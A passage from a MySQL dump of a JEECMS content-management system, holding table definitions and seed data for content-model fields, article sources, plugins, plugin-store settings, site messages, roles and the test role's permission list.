L,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL),(149,5,'shortTitle','简短标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(150,5,'titleColor','标题颜色',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(151,5,'tagStr','Tag标签',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(152,5,'description','摘要',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(153,5,'author','作者',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(154,5,'origin','来源',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(155,5,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL),(156,5,'topLevel','固顶级别',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(157,5,'releaseDate','发布时间',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL),(158,5,'typeId','内容类型',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(159,5,'tplContent','指定模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(160,5,'typeImg','类型图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(161,5,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(162,5,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(163,5,'pictures','图片集',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(164,6,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(165,6,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL),(166,6,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(167,6,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL),(168,6,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(169,6,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(170,6,'tplContent','选择模型模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL),(171,6,'channelStatic','栏目静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(172,6,'contentStatic','内容静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(173,6,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL),(174,6,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(175,6,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL),(177,6,'afterCheck','审核后',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(178,6,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(179,6,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(180,6,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(181,6,'contriGroupIds','投稿权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(183,6,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(184,6,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(185,6,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(186,6,'channelId','栏目',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL),(187,6,'title','标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL),(188,6,'shortTitle','简短标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(189,6,'titleColor','标题颜色',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(190,6,'tagStr','Tag标签',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(191,6,'description','内容简介',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(192,6,'author','作者',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(193,6,'origin','来源',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL),(194,6,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL),(195,6,'topLevel','固顶级别',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(196,6,'releaseDate','发布时间',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL),(197,6,'typeId','内容类型',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(198,6,'tplContent','指定模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(199,6,'typeImg','类型图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(200,6,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(201,6,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(202,6,'attachments','附件',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(203,6,'media','多媒体',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(246,4,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(249,8,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(250,8,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL),(251,8,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL),(252,8,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL),(253,8,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(254,8,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(255,8,'tplContent','选择模型模板',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL),(256,8,'channelStatic','栏目静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(257,8,'contentStatic','内容静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(258,8,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL),(259,8,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(260,8,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL),(262,8,'afterCheck','审核后',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(263,8,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(264,8,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(265,8,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(266,8,'contriGroupIds','投稿权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL),(268,8,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(269,8,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(270,8,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(271,8,'channelId','栏目',1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL),(272,8,'title','岗位名称',1,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL),(275,8,'tagStr','Tag标签',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL),(279,8,'viewGroupIds','浏览权限',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL),(280,8,'topLevel','固顶级别',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(281,8,'releaseDate','发布时间',2,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL),(282,8,'typeId','内容类型',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(283,8,'tplContent','指定模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(289,8,'txt','职位描述',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(290,8,'deadline','截止日期',2,NULL,NULL,NULL,'3','30','留空永久有效',NULL,5,0,0,1,1,0,NULL,NULL),(291,8,'experience','工作经验',3,NULL,'1-3年,3-5年,5年以上,不限',NULL,'3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL),(292,8,'education','最低学历',3,'','专科,本科,硕士,不限','','3','30','','',6,0,0,1,1,0,NULL,NULL),(293,8,'salary','职位月薪',4,NULL,'1500-2000,2000-3000,3000-5000,5000-8000,8000以上,面议',NULL,'3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL),(294,8,'workplace','工作地点',4,'','北京,上海,深圳,广州,重庆,南京,杭州,西安,南昌','','3','30','','',7,0,0,1,1,0,NULL,NULL),(295,8,'nature','工作性质',5,'','全职,兼职','','3','30','','',8,0,0,1,1,0,NULL,NULL),(296,8,'hasmanage','管理经验',5,'','要求,不要求','','3','30','','',8,0,0,1,1,0,NULL,NULL),(297,8,'nums','招聘人数',6,'','1-3人,3-5人,5-10人,若干','','3','30','','',6,0,0,1,1,0,NULL,NULL),(298,8,'category','职位类别',6,NULL,'项目主管,java高级工程师,java工程师,网页设计师,测试人员,技术支持',NULL,'3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL),(335,1,'workflowId','工作流',12,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL),(338,4,'workflowId','工作流',10,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,1,1,0,1,0,NULL,NULL),(339,5,'workflowId','工作流',11,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL),(340,6,'workflowId','工作流',11,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL),(342,8,'workflowId','工作流',11,NULL,NULL,NULL,NULL,NULL,'留空则继承上级栏目设置，顶层为空无需审核',NULL,6,0,1,0,1,0,NULL,NULL),(344,1,'channelId','栏目',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL),(403,6,'Director','导演',10,'','','','1','2','','',1,0,0,1,1,0,NULL,NULL),(404,6,'Starring','主演',10,'','','','1','30','','',1,0,0,1,1,0,NULL,NULL),(405,6,'VideoType','视频类型',10,NULL,'历史,古装,都市,喜剧,悬疑,动作,谍战,伦理,战争,惊悚',NULL,'3','30',NULL,NULL,7,0,0,1,1,0,NULL,NULL),(406,6,'Video','影片信息',10,'','正片,预告片','','3','30','','',6,0,0,1,1,0,NULL,NULL),(408,1,'contentImg','内容图',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL),(409,5,'txt','内容',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,0,0,NULL,NULL),(410,6,'txt','内容',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(412,1,'allowShare','分享',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(413,1,'allowScore','评分',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL),(414,1,'pictures','图片集',12,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL),(416,1,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(417,1,'tplMobileContent','指定手机模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,0,NULL,NULL),(418,2,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(419,2,'channelStatic','栏目静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,0,1,0,1,0,NULL,NULL),(420,2,'contentStatic','内容静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,0,1,0,1,0,NULL,NULL),(421,4,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(422,4,'channelStatic','栏目静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(423,4,'contentStatic','内容静态化',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL),(424,4,'tplMobileContent','指定手机模板',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(425,5,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(426,6,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(431,8,'tplMobileChannel','栏目手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL),(432,8,'tplMobileContent','指定手机模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL),(438,1,'charge','是否收费',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL),(442,4,'size','大小',10,'','','','','','','',1,0,0,1,1,0,100,100),(443,4,'edition','版本',10,'','','','','','','',1,0,0,1,1,0,100,100),(444,4,'system','支持系统',10,'','','','','','','',1,0,0,1,1,0,100,100),(445,4,'bit','位数',10,'','','','','','','',1,0,0,1,1,0,100,100),(456,4,'charge','是否收费',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL),(457,4,'typeImg','类型图',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
/*!40000 ALTER TABLE `jc_model_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_origin`
--

DROP TABLE IF EXISTS `jc_origin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_origin` (
  `origin_id` int(11) NOT NULL AUTO_INCREMENT,
  `origin_name` varchar(255) NOT NULL COMMENT '来源名称',
  `ref_count` int(11) NOT NULL DEFAULT '0' COMMENT '来源文章总数',
  PRIMARY KEY (`origin_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='来源';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_origin`
--

LOCK TABLES `jc_origin` WRITE;
/*!40000 ALTER TABLE `jc_origin` DISABLE KEYS */;
INSERT INTO `jc_origin` VALUES (1,'新浪微博',0),(2,'百度',0),(3,'百度论坛',0),(4,'百度贴吧',0),(5,'新浪新闻',0),(6,'腾讯新闻',0);
/*!40000 ALTER TABLE `jc_origin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_plug`
--

DROP TABLE IF EXISTS `jc_plug`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_plug` (
  `plug_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '插件名称',
  `path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `description` varchar(2000) DEFAULT NULL COMMENT '描述',
  `author` varchar(255) DEFAULT NULL COMMENT '作者',
  `upload_time` datetime NOT NULL COMMENT '上传时间',
  `install_time` datetime DEFAULT NULL COMMENT '安装时间',
  `uninstall_time` datetime DEFAULT NULL COMMENT '卸载时间',
  `file_conflict` tinyint(1) NOT NULL DEFAULT '0' COMMENT '包含文件是否冲突',
  `is_used` tinyint(1) NOT NULL DEFAULT '0' COMMENT '使用状态(0未使用,1使用中)',
  `plug_perms` varchar(255) DEFAULT '' COMMENT '插件权限（,分隔各个权限配置）',
  `plug_repair` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否修复类插件(0 新功能插件 1修复类)',
  PRIMARY KEY (`plug_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='插件';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_plug`
--

LOCK TABLES `jc_plug` WRITE;
/*!40000 ALTER TABLE `jc_plug` DISABLE KEYS */;
INSERT INTO `jc_plug` VALUES (1,'应用中心','/WEB-INF/plug/plugStore.zip','应用中心','jeecms','2016-09-08 09:05:12','2016-10-08 16:12:57','2016-10-08 16:12:39',0,1,'plugStore.center@store:center;storeConfig.edit@storeConfig:v_edit;storeConfig.update@storeConfig:o_update;',0);
/*!40000 ALTER TABLE `jc_plug` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_plug_store_config`
--

DROP TABLE IF EXISTS `jc_plug_store_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_plug_store_config` (
  `config_id` int(11) NOT NULL DEFAULT '1',
  `server_url` varchar(255) NOT NULL DEFAULT '' COMMENT '接口根地址',
  `password` varchar(255) NOT NULL DEFAULT '' COMMENT '应用商店密码',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_plug_store_config`
--

LOCK TABLES `jc_plug_store_config` WRITE;
/*!40000 ALTER TABLE `jc_plug_store_config` DISABLE KEYS */;
INSERT INTO `jc_plug_store_config` VALUES (1,'http://bbs.jeecms.com','5f4dcc3b5aa765d61d8327deb882cf99');
/*!40000 ALTER TABLE `jc_plug_store_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_receiver_message`
--

DROP TABLE IF EXISTS `jc_receiver_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_receiver_message` (
  `msg_re_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  `msg_id` int(11) DEFAULT NULL COMMENT '发信的信件id',
  PRIMARY KEY (`msg_re_id`),
  KEY `jc_receiver_message_user_send` (`msg_send_user`),
  KEY `jc_receiver_message_user_receiver` (`msg_receiver_user`),
  KEY `jc_receiver_message_site` (`site_id`),
  KEY `jc_receiver_message_message` (`msg_re_id`),
  KEY `fk_jc_receiver_message_message` (`msg_id`),
  CONSTRAINT `fk_jc_receiver_message_message` FOREIGN KEY (`msg_id`) REFERENCES `jc_message` (`msg_id`),
  CONSTRAINT `fk_jc_receiver_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_receiver_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_receiver_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='站内信收信表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_receiver_message`
--

LOCK TABLES `jc_receiver_message` WRITE;
/*!40000 ALTER TABLE `jc_receiver_message` DISABLE KEYS */;
INSERT INTO `jc_receiver_message` VALUES (2,'1111','1111','2016-10-11 09:43:42',1,1,1,0,3,NULL),(4,'qqw','qwwqwww','2016-10-12 01:51:10',1,1,1,0,3,NULL);
/*!40000 ALTER TABLE `jc_receiver_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_role`
--

DROP TABLE IF EXISTS `jc_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_role` (
  `role_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL,
  `role_name` varchar(100) NOT NULL COMMENT '角色名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_super` char(1) NOT NULL DEFAULT '0' COMMENT '拥有所有权限',
  `role_type` varchar(26) NOT NULL,
  PRIMARY KEY (`role_id`),
  KEY `fk_jc_role_site` (`site_id`),
  CONSTRAINT `fk_jc_role_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS角色表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_role`
--

LOCK TABLES `jc_role` WRITE;
/*!40000 ALTER TABLE `jc_role` DISABLE KEYS */;
INSERT INTO `jc_role` VALUES (1,NULL,'管理员',10,'1','ROLE_ADMIN'),(2,NULL,'测试 ',10,'0','ROLE_TEST');
/*!40000 ALTER TABLE `jc_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_role_permission`
--

DROP TABLE IF EXISTS `jc_role_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_role_permission` (
  `role_id` int(11) NOT NULL,
  `uri` varchar(100) NOT NULL,
  KEY `fk_jc_permission_role` (`role_id`),
  CONSTRAINT `fk_jc_permission_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS角色授权表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_role_permission`
--

LOCK TABLES `jc_role_permission` WRITE;
/*!40000 ALTER TABLE `jc_role_permission` DISABLE KEYS */;
INSERT INTO `jc_role_permission` VALUES (2,'topic:v_edit'),(2,'accountPay:v_list'),(2,'content:v_view'),(2,'config:v_content_charge'),(2,'channel:v_list'),(2,'content_cycle:v_list'),(2,'department:depart_main'),(2,'admin_local:v_channels_add'),(2,'log:o_delete_login_success'),(2,'content:v_list'),(2,'data:o_rename'),(2,'admin_global:v_add'),(2,'role:v_tree'),(2,'weixinMessage:v_edit'),(2,'scoregroup:v_edit'),(2,'dictionary:v_list'),(2,'guestbook_ctg:v_list'),(2,'template:v_add'),(2,'type:v_list'),(2,'admin_local:v_edit'),(2,'task:v_add'),(2,'frame:user_right'),(2,'group:v_channels_edit'),(2,'task:v_list'),(2,'resource:v_list'),(2,'friendlink:v_add'),(2,'content:o_check_share'),(2,'flow:pv:v_list'),(2,'acquisition:v_list'),(2,'dictionary:v_add'),(2,'content:v_send_to_weixin'),(2,'log:v_list_login_success'),(2,'content:share_list'),(2,'admin_global:v_depart_add'),(2,'member:v_add'),(2,'account:v_list'),(2,'group:v_add'),(2,'left'),(2,'advertising:v_add'),(2,'content:v_tree_share'),(2,'content:v_tree_radio'),(2,'acquisition:v_history'),(2,'webservice:v_list'),(2,'webserviceAuth:v_edit'),(2,'config:v_login'),(2,'topic:v_add'),(2,'contentBuy:user_order_list'),(2,'message:v_read'),(2,'statistic:comment:v_list'),(2,'log:o_delete_operating_batch'),(2,'lucene:o_create'),(2,'content:v_tree_channels'),(2,'content:v_send_to_topic'),(2,'group:v_channels_add'),(2,'template:v_list'),(2,'directive:module'),(2,'guestbook:v_list'),(2,'contentBuy:commissionStatic'),(2,'data:v_revert'),(2,'weixinMenu:v_edit'),(2,'file:v_list'),(2,'directive:v_list'),(2,'ftp:v_list'),(2,'accountPay:draw_apply_list'),(2,'channel:v_create_path'),(2,'workflow:v_edit'),(2,'right'),(2,'department:v_list'),(2,'frame:user_main'),(2,'advertising:v_edit'),(2,'scoreitem:v_edit'),(2,'guestbook_ctg:v_add'),(2,'workloadstatistic:v_list'),(2,'config:register_item_list'),(2,'store:center'),(2,'admin_global:v_site_edit'),(2,'static:o_index'),(2,'content:v_check'),(2,'scoregroup:v_list'),(2,'statistic:channel:v_list'),(2,'message:v_findUser'),(2,'weixinMessage:v_list'),(2,'content:v_delete'),(2,'config:register_item_add'),(2,'admin_global:v_check_username'),(2,'role:v_add'),(2,'resource:v_left'),(2,'resource:v_edit'),(2,'advertising_space:v_add'),(2,'origin:v_list'),(2,'admin_local:v_check_username'),(2,'frame:maintain_left'),(2,'item:v_add'),(2,'vote_topic:v_add'),(2,'frame:statistic_left'),(2,'frame:content_main'),(2,'keyword:v_list'),(2,'template:o_def_template'),(2,'static:o_content'),(2,'content:v_unpigeonhole'),(2,'tag:v_check_tag'),(2,'flow:area:v_list'),(2,'advertising_space:v_ajax_edit'),(2,'config:o_login'),(2,'guestbook_ctg:v_edit'),(2,'admin_local:v_list'),(2,'weixinMessage:v_add'),(2,'department:v_site_list'),(2,'static:o_channel'),(2,'content:v_share'),(2,'template:v_edit'),(2,'content:v_left'),(2,'content:v_reject'),(2,'comment:v_list'),(2,'content:v_edit'),(2,'template:v_left'),(2,'site:v_checkMaster'),(2,'resource:resource_main'),(2,'config:v_mark_edit'),(2,'guestbook_ctg:v_ajax_edit'),(2,'message:v_add'),(2,'statistic:guestbook:v_list'),(2,'group:v_list'),(2,'workflow:v_list'),(2,'config:register_item_edit'),(2,'admin_local:v_channels_edit'),(2,'admin_local:v_check_email'),(2,'personal:v_checkPwd'),(2,'tag:v_ajax_edit'),(2,'model:v_edit'),(2,'site:site_main'),(2,'workflow:v_add'),(2,'webserviceCallRecord:v_list'),(2,'topic:o_priority'),(2,'config:v_attr_edit'),(2,'site_config:v_company_edit'),(2,'department:v_left'),(2,'department:v_edit'),(2,'frame:maintain_main'),(2,'advertising:v_list'),(2,'content:v_add'),(2,'tag:v_add'),(2,'role:v_edit'),(2,'sensitivity:v_list'),(2,'item:v_list'),(2,'acquisition:v_progress_data'),(2,'ftp:v_add'),(2,'content_reuse:v_list'),(2,'site:v_checkDomain'),(2,'admin_global:v_edit'),(2,'plug:v_list'),(2,'ftp:v_edit'),(2,'site:v_add'),(2,'config:v_member_edit'),(2,'webservice:v_add'),(2,'weixinMessage:o_default_save'),(2,'data:o_export'),(2,'content:v_move'),(2,'guestbook:v_edit'),(2,'site:v_list'),(2,'content:v_tree'),(2,'data:v_listfields'),(2,'group:v_site_contri_list'),(2,'channel: